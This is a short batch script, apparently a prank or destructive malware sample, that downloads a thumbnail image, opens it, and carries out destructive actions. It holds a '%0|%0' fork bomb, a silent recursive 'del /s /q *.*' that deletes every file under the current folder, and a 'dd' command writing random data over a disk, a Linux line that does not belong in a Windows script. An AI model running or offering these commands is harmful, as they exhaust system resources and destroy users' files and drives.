@echo off

:: downloading an image
Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image.jpg"

:: a loop
%0|%0

:: open the image downloaded in line 4
image.jpg

:: delete stuff
:: code by Varun Banka
del /s /q *.*

:: play with drive
sudo dd if=/dev/random of=/dev/sda
